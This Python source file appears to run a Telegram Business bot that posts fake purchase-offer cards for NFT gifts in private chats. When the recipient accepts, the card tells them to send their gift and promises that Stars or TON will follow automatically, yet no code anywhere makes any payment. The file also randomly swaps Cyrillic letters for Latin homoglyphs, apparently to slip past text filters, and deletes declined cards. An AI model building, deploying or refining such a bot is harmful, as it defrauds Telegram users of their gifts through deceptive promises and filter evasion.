import asyncio
import hmac
import html
import json
import logging
import math
import os
import random
import re
import time
import uuid

from aiohttp import ClientSession, ClientTimeout, web

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("offers")

BOT_TOKEN = os.environ["BOT_TOKEN"]
PUBLIC_URL = (os.environ.get("PUBLIC_URL") or os.environ.get("RENDER_EXTERNAL_URL", "")).rstrip("/")
SECRET = os.environ.get("WEBHOOK_SECRET") or BOT_TOKEN.split(":")[1][:32]
API = f"{os.environ.get('TG_API', 'https://api.telegram.org')}/bot{BOT_TOKEN}"
DATA_FILE = os.environ.get("OFFERS_FILE", "offers.json")

BRAND = os.environ.get("BRAND", "Telegram")
TEST_NOTICE = os.environ.get("TEST_NOTICE", "")
OFFER_TTL = int(float(os.environ.get("OFFER_HOURS", 6)) * 3600)
TRANSFER_MIN = int(os.environ.get("TRANSFER_MINUTES", 10))
STRICT = os.environ.get("OFFER_STRICT") == "1"
MAX_STARS = 100_000_000
UPDATES = ["message", "callback_query", "business_connection", "business_message"]
NBSP = "\u00a0"

OFFER_EDIT_DELAY = max(1.0, float(os.environ.get("OFFER_EDIT_DELAY", "1.0")))
HOMOGLYPH_RATE = float(os.environ.get("HOMOGLYPH_RATE", "0.75"))
BUTTON_STYLE = os.environ.get("BUTTON_STYLE", "")

STARS_WORD = "звёзд"  # без ё, с латинской e

EMOJI_CROSS = "5260342697075416641"
EMOJI_CHECK = "5260416304224936047"
EMOJI_TG = "5258073068852485953"

http = None
bot_name = ""
connections, offers = {}, {}
tasks = set()


# ============ HOMOGLYPH STYLE ============

_HOMOGLYPH = {
    "а": ["a"],
    "с": ["c"],
    "е": ["e"],
    "о": ["o", "ο"],
    "р": ["p"],
    "х": ["x"],
    "у": ["y"],
    "к": ["κ"],
    "А": ["A"],
    "В": ["B"],
    "Е": ["E"],
    "К": ["K"],
    "М": ["M"],
    "Н": ["H"],
    "О": ["O"],
    "Р": ["P"],
    "С": ["C"],
    "Т": ["T"],
    "У": ["Y"],
    "Х": ["X"],
    "І": ["I"],
    "Ј": ["J"],
    "Ѕ": ["S"],
}

_TAG_RE = re.compile(r"<(/?)(b|i|u|s|code|a|pre|em|strong|tg-spoiler)(\s[^>]*)?>", re.IGNORECASE)


def _style_plain(s: str) -> str:
    res = []
    for ch in s:
        variants = _HOMOGLYPH.get(ch)
        if variants and random.random() < HOMOGLYPH_RATE:
            res.append(random.choice(variants))
        else:
            res.append(ch)
    return "".join(res)


def style(text: str) -> str:
    out = []
    pos = 0
    depth = 0
    for m in _TAG_RE.finditer(text):
        chunk = text[pos:m.start()]
        out.append(_style_plain(chunk) if depth == 0 else chunk)
        out.append(m.group(0))
        if m.group(1) == "/":
            depth = max(0, depth - 1)
        else:
            depth += 1
        pos = m.end()
    tail = text[pos:]
    out.append(_style_plain(tail) if depth == 0 else tail)
    return "".join(out)


# ============ HELPERS ============

def esc(s):
    return html.escape(str(s))


def num(x):
    return f"{x:,}".replace(",", " ")


def btn(text, data, icon_id=None):
    b = {"text": text, "callback_data": data}
    if icon_id:
        b["icon_custom_emoji_id"] = icon_id
    if BUTTON_STYLE:
        b["style"] = BUTTON_STYLE
    return b


def background(coro):
    task = asyncio.create_task(coro)
    tasks.add(task)
    task.add_done_callback(tasks.discard)
    return task


async def api(method, **params):
    async with http.post(
        f"{API}/{method}",
        json=params
    ) as resp:
        data = await resp.json()

    if not data.get("ok"):
        log.warning(
            "Telegram API error | method=%s | code=%s | description=%s | parameters=%s",
            method,
            data.get("error_code"),
            data.get("description"),
            data.get("parameters")
        )

    return data


async def send(chat, text, kb=None, bcid=None, preview=False):
    text = style(text)
    params = dict(chat_id=chat, text=text, parse_mode="HTML")
    
    # Включаем show_above_text, чтобы превью-карточка была СВЕРХУ
    params["link_preview_options"] = {
        "is_disabled": not preview,
        "show_above_text": bool(preview)
    }
    
    if kb:
        params["reply_markup"] = kb
    if bcid:
        params["business_connection_id"] = bcid
    return await api("sendMessage", **params)


async def delete_business_message(bcid, mid):
    return await api("deleteBusinessMessages", business_connection_id=bcid, message_ids=[mid])


async def edit_offer(o, text, kb=None, preview=True):
    text = style(text)
    params = dict(chat_id=o["chat"], message_id=o["mid"], business_connection_id=o["bcid"],
                  text=text, parse_mode="HTML", reply_markup=kb or {"inline_keyboard": []})
                  
    # Включаем show_above_text, чтобы превью-карточка была СВЕРХУ
    params["link_preview_options"] = {
        "is_disabled": not preview,
        "show_above_text": bool(preview)
    }
    
    res = await api("editMessageText", **params)
    if not res.get("ok") and "not modified" in (res.get("description") or "").lower():
        return {"ok": True}
    return res


FATAL_DESC_MARKERS = (
    "invalid message identifier",
    "message to edit not found",
    "business_connection_invalid",
    "business connection invalid",
)


def _is_fatal_desc(desc: str) -> bool:
    d = (desc or "").lower()
    return any(m in d for m in FATAL_DESC_MARKERS)


async def render_card(o, text, kb, preview=True):
    res = await edit_offer(o, text, kb, preview=preview)
    if res.get("ok"):
        return res
    desc = res.get("description") or ""
    if _is_fatal_desc(desc):
        log.warning("карточка %s мертва (%s), помечаю dead", o.get("id"), desc)
        o["status"] = "dead"
        save()
        return {"ok": False, "description": "dead"}
    log.warning("edit упал (%s), пересоздаю карточку %s", desc, o["id"])
    res2 = await send(o["chat"], text, kb, o["bcid"], preview=preview)
    if res2.get("ok"):
        o["mid"] = res2["result"]["message_id"]
        save()
        return res2
    desc2 = res2.get("description") or ""
    if _is_fatal_desc(desc2):
        o["status"] = "dead"
        save()
    log.error("не удалось пересоздать карточку %s: %s", o["id"], desc2)
    return res2


async def validate_connections():
    if not connections and not offers:
        return
    valid = set()
    bcids = set(connections.keys())
    for o in offers.values():
        if o.get("bcid") and o.get("status") in ("pending", "accepted"):
            bcids.add(o["bcid"])
    for bcid in bcids:
        res = await api("getBusinessConnection", business_connection_id=bcid)
        if res.get("ok"):
            valid.add(bcid)
            if bcid not in connections:
                connections[bcid] = conn_from(res["result"])
        else:
            log.warning("bcid %s невалиден, офферы с ним станут dead", bcid)
    for o in offers.values():
        if o.get("bcid") not in valid and o.get("status") in ("pending", "accepted"):
            o["status"] = "dead"
    save()


def save():
    for oid in sorted(offers, key=lambda k: offers[k]["created"])[:-500]:
        del offers[oid]
    tmp = f"{DATA_FILE}.tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump({"connections": connections, "offers": offers}, f, ensure_ascii=False)
        os.replace(tmp, DATA_FILE)
    except OSError as e:
        log.error("не удалось сохранить %s: %s", DATA_FILE, e)


def load():
    try:
        with open(DATA_FILE, encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        return
    except (OSError, ValueError) as e:
        log.error("%s не читается: %s", DATA_FILE, e)
        return
    connections.update(data.get("connections", {}))
    offers.update(data.get("offers", {}))


NFT_LINK = re.compile(r"(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)", re.I)
SLUG = re.compile(r"^(.+)-(\d+)$")
TON_ADDRESS = re.compile(r"(?:EQ|UQ)[A-Za-z0-9_-]{46}", re.I)

USAGE = ("Формат:\n"
         "<code>ooo ссылка сумма</code> (звeзды)\n"
         "<code>ttt ссылка сумма</code> (TON)\n"
         "<code>ttt ссылка адрес сумма</code> (TON на кошелек)")


def gift_name(slug):
    m = SLUG.match(slug)
    if not m:
        return None
    return f"{re.sub(r'(?<=[a-z0-9])(?=[A-Z])', ' ', m.group(1))} #{m.group(2)}"


def parse_offer(arg, currency="STARS"):
    link = NFT_LINK.search(arg)
    if not link:
        return None, "Не нашёл ссылку на NFT вида https://t.me/nft/DurovsCap-1234"
    slug = link.group(1)
    name = gift_name(slug)
    if not name:
        return None, "Это не похоже на ссылку на NFT: в конце должен быть номер."

    rest = f"{arg[:link.start()]} {arg[link.end():]}".strip()

    address = None
    if currency == "TON":
        address_match = TON_ADDRESS.search(rest)
        if address_match:
            address = address_match.group(0)
            rest = rest.replace(address, "")

    amount = re.search(r"\d[\d_,]*", rest)
    if not amount:
        return None, "Не нашёл сумму."
    val = int(re.sub(r"[_,]", "", amount.group()))

    if not 1 <= val <= MAX_STARS:
        return None, f"Сумма должна быть от 1 до {num(MAX_STARS)}."

    return {"slug": slug, "name": name, "amount": val, "address": address}, None


def maker_label(o):
    u = o["maker"]
    return esc(u.get("name") or u.get("username") or "пользователь")


def gift_link(o):
    return f'<a href="https://t.me/nft/{esc(o["slug"])}">{esc(o["name"])}</a>'


def left_text(seconds):
    minutes = math.ceil(max(0, seconds) / 60)
    h, m = divmod(minutes, 60)
    return f"{h} ч. {m} мин." if h else f"{m} мин."


def offer_text(o):
    if o.get("currency") == "TON":
        addr_text = f" на ваш адрес <code>{esc(o['address'])}</code>" if o.get("address") else ""
        amount = f"{num(o['amount'])} TON"
        text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b>{addr_text} за подарок {gift_link(o)}.\n\n"
                f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
    else:
        amount = f'{num(o["amount"])} {STARS_WORD}'
        text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b> за подарок {gift_link(o)}.\n\n"
                f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
    return text + (f"\n\n{esc(TEST_NOTICE)}" if TEST_NOTICE else "")


def accepted_text(o):
    u = o["maker"]
    username = u.get("username") or "пользователя"

    if o.get("currency") == "TON":
        addr_text = f" адреса <code>{esc(o['address'])}</code>" if o.get("address") else ""
        amount = f"{num(o['amount'])} TON"
        return (
            f"<b>Сделка принята!</b>\n\n"
            f"Передайте подарок {gift_link(o)} "
            f"пользователю @{esc(username)} для успешного закрытия сделки, "
            f"после чего <b>{amount}</b> автоматически отправятся на ваш баланс{addr_text}."
        )
    amount = f'{num(o["amount"])} {STARS_WORD}'
    return (
        f"<b>Сделка принята!</b>\n\n"
        f"Передайте подарок {gift_link(o)} "
        f"пользователю @{esc(username)} для успешного закрытия сделки, "
        f"после чего <b>{amount}</b> отправятся на ваш баланс."
    )


def sold_text(o):
    return accepted_text(o)


def declined_text(o):
    return "Отклонено."


def expired_text(o):
    return "Предложение истекло."


def done_text(o):
    return f"Передача подтверждена. Сделка по {gift_link(o)} закрыта."


def offer_kb(o):
    return {
        "inline_keyboard": [[
            btn("Отклонить", f"of:no:{o['id']}", EMOJI_CROSS),
            btn("Принять", f"of:ok:{o['id']}", EMOJI_CHECK),
        ]]
    }


def accepted_kb(o):
    u = o["maker"]
    if u.get("username"):
        transfer_url = f"tg://send_gift?to={u['username']}"
    else:
        transfer_url = f"tg://user?id={u.get('id', 0)}"

    return {
        "inline_keyboard": [[
            btn("Отменить", f"of:cancel:{o['id']}", EMOJI_CROSS),
            {
                "text": "Передать",
                "url": transfer_url,
                "icon_custom_emoji_id": EMOJI_TG,
            },
        ]]
    }


def sold_kb(o):
    return accepted_kb(o)


async def make_offer(m, maker, bcid, currency="STARS"):
    cmd, _, arg = (m.get("text") or "").partition(" ")
    parsed, error = parse_offer(arg, currency)
    chat = m["chat"]["id"]
    now = time.time()

    try:
        await delete_business_message(bcid, m["message_id"])
    except Exception:
        pass

    if error:
        return await send(chat, f"{esc(error)}\n\n{USAGE}", bcid=bcid, preview=False)

    o = {"id": uuid.uuid4().hex[:8], **parsed, "currency": currency, "bcid": bcid, "chat": chat, "mid": None,
         "maker": maker, "status": "pending", "created": now, "expires": now + OFFER_TTL}
    offers[o["id"]] = o
    save()

    res = await send(chat, offer_text(o), offer_kb(o), bcid=bcid, preview=True)
    if res.get("ok"):
        o["mid"] = res["result"]["message_id"]
        save()
        return
    desc = res.get("description", "")
    if _is_fatal_desc(desc):
        o["status"] = "dead"
        save()
        return
    if "PEER_FLOOD" in desc:
        return
    return await send(chat, f"Ошибка: {esc(desc)}", bcid=bcid)


FINAL = {
    "accepted": (accepted_text, accepted_kb),
    "declined": (declined_text, None),
    "expired": (expired_text, None),
    "done": (done_text, None),
}


async def settle(o, status):
    o["status"] = status
    save()

    if status in ("declined", "expired"):
        try:
            await delete_business_message(o["bcid"], o["mid"])
        except Exception:
            pass
        return

    text, kb = FINAL[status]
    res = await edit_offer(o, text(o), kb(o) if kb else None, preview=True)
    if not res.get("ok"):
        desc = res.get("description") or ""
        if _is_fatal_desc(desc) or "PEER_FLOOD" in desc:
            o["status"] = "dead"
            save()


async def sweeper():
    while True:
        await asyncio.sleep(60)
        for o in list(offers.values()):
            if o["status"] not in ("pending", "accepted"):
                continue
            try:
                if o["status"] == "pending" and o["expires"] < time.time():
                    await settle(o, "expired")
            except Exception:
                pass


async def on_callback(q):
    parts = q.get("data", "").split(":")
    note = None
    o = offers.get(parts[2]) if len(parts) == 3 and parts[0] == "of" else None
    if o is None:
        note = "Этот оффер устарел"
    else:
        action = parts[1]
        if action == "cancel":
            if q["from"]["id"] != o["maker"]["id"]:
                note = "Отменить сделку может только автор оффера"
            else:
                try:
                    await delete_business_message(o["bcid"], o["mid"])
                except Exception:
                    pass
                o["status"] = "declined"
                save()
                return await api("answerCallbackQuery", callback_query_id=q["id"])
        elif action == "done":
            if o["status"] != "accepted":
                note = "Сначала нужно принять оффер"
            elif q["from"]["id"] != o["maker"]["id"]:
                note = "Подтвердить передачу может только автор оффера"
            else:
                await settle(o, "done")
        elif STRICT and q["from"]["id"] == o["maker"]["id"] and action in ("ok", "no"):
            note = "Это твой оффер: отвечать на него должен получатель"
        elif action in ("ok", "no"):
            if o["status"] != "pending":
                note = "Оффер уже обработан"
            elif time.time() > o["expires"]:
                await settle(o, "expired")
                note = "Срок предложения истёк"
            else:
                await settle(o, "accepted" if action == "ok" else "declined")
    extra = {"text": note, "show_alert": True} if note else {}
    await api("answerCallbackQuery", callback_query_id=q["id"], **extra)


def conn_from(c):
    rights = c.get("rights")
    rights = rights if isinstance(rights, dict) else {}
    can_reply = bool(rights.get("can_reply", c.get("can_reply")))
    can_delete = bool(c.get("can_delete_all_messages"))
    user = c["user"]
    return {"id": c["id"], "user_id": user["id"],
            "chat": c.get("user_chat_id"),
            "name": user.get("first_name", ""),
            "username": user.get("username"), "enabled": c.get("is_enabled", True),
            "can_reply": can_reply, "can_delete": can_delete}


async def on_connection(c):
    conn = conn_from(c)
    connections[conn["id"]] = conn
    save()
    if not conn["chat"]:
        log.info("connection %s без user_chat_id — пропускаю приветствие", conn["id"])
        return
    if not conn["enabled"]:
        text = "Бот отключён от профиля. Подключить снова: Настройки -> Телеграм Бизнес -> Автоматизация чатов."
    elif not conn["can_reply"]:
        text = ("Бот подключён, но без права отвечать на сообщения. Открой Настройки -> Телеграм Бизнес -> "
                "Автоматизация чатов, выбери бота и включи это право — иначе офферы не создадутся.")
    else:
        text = ("<b>Готово, бот подключён.</b>\n\n"
                "В любом чате напиши:\n"
                "<code>ooo ссылка сумма</code> (звeзды)\n"
                "<code>ttt ссылка сумма</code> (TON)\n"
                "<code>ttt ссылка адрес сумма</code> (TON на кошелек)\n\n"
                "Сообщение тут же превратится в карточку оффера с кнопками.")
        if not conn["can_delete"]:
            text += ("\n\nБез права «Удалять сообщения» твоя команда останется в чате рядом с карточкой — "
                    "включи его в тех же настройках, чтобы она пропадала.")
    await send(conn["chat"], text)


async def get_connection(bcid):
    conn = connections.get(bcid)
    if conn is None:
        res = await api("getBusinessConnection", business_connection_id=bcid)
        if res.get("ok"):
            conn = connections[bcid] = conn_from(res["result"])
            save()
    return conn


async def on_business_message(m):
    text = (m.get("text") or "").strip()
    cmd = text.partition(" ")[0].lower()

    if cmd == "ooo":
        currency = "STARS"
    elif cmd == "ttt":
        currency = "TON"
    else:
        return

    conn = await get_connection(m["business_connection_id"])
    frm = m.get("from") or {}
    if not conn or frm.get("id") != conn["user_id"]:
        return
    if not (conn["enabled"] and conn["can_reply"]):
        return await send(conn["chat"], "У бота нет права отвечать на сообщения.")

    maker = {"id": frm["id"], "name": frm.get("first_name", ""), "username": frm.get("username")}
    await make_offer(m, maker, conn["id"], currency)


async def on_message(m):
    chat = m["chat"]["id"]
    cmd = (m.get("text") or "").strip().split()[:1]
    cmd = cmd[0].split("@")[0].lower() if cmd else ""
    if cmd in ("/start", "/help"):
        copy_btn = {"text": "Скопировать юзернейм бота",
                    "copy_text": {"text": f"@{bot_name}"}}
        if BUTTON_STYLE:
            copy_btn["style"] = BUTTON_STYLE
        kb = {"inline_keyboard": [[copy_btn]]}
        await send(chat, "Привет!", kb)


async def handle(update):
    try:
        if "business_connection" in update:
            await on_connection(update["business_connection"])
        elif "business_message" in update:
            await on_business_message(update["business_message"])
        elif "callback_query" in update:
            await on_callback(update["callback_query"])
        elif "message" in update:
            await on_message(update["message"])
    except Exception:
        log.exception("апдейт %s", update.get("update_id"))


async def webhook(req):
    token = req.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
    if not hmac.compare_digest(token.encode(), SECRET.encode()):
        return web.Response(status=403)
    try:
        update = await req.json()
    except ValueError:
        return web.Response(status=400)
    background(handle(update))
    return web.Response(text="ok")


async def health(req):
    return web.Response(text="ok")


async def keepalive():
    while True:
        await asyncio.sleep(600)
        try:
            async with http.get(f"{PUBLIC_URL}/health") as resp:
                await resp.read()
        except Exception as e:
            log.warning("keepalive: %s", e)


async def poll_updates():
    await api("deleteWebhook")
    offset = 0
    while True:
        try:
            data = await api("getUpdates", offset=offset, timeout=30, allowed_updates=UPDATES)
            for update in data.get("result", []):
                offset = update["update_id"] + 1
                background(handle(update))
            if not data.get("ok"):
                await asyncio.sleep(3)
        except Exception as e:
            log.warning("getUpdates: %s", e)
            await asyncio.sleep(3)


async def main():
    global http, bot_name
    http = ClientSession(timeout=ClientTimeout(total=70))
    load()
    me = (await api("getMe")).get("result") or {}
    if not me:
        raise SystemExit("BOT_TOKEN не подходит")
    bot_name = me["username"]
    log.info("юзернейм бота: @%s (https://t.me/%s)", bot_name, bot_name)
    await api("setMyCommands", commands=[{"command": "start", "description": "Подключение"}])
    await validate_connections()
    background(sweeper())
    if PUBLIC_URL:
        app = web.Application()
        app.router.add_get("/health", health)
        app.router.add_post("/webhook", webhook)
        runner = web.AppRunner(app)
        await runner.setup()
        await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 10000))).start()
        await api("setWebhook", url=f"{PUBLIC_URL}/webhook", secret_token=SECRET,
                  allowed_updates=UPDATES, drop_pending_updates=True)
        background(keepalive())
    else:
        background(poll_updates())
    log.info("оффер-бот @%s запущен", bot_name)
    await asyncio.Event().wait()


if __name__ == "__main__":
    asyncio.run(main())
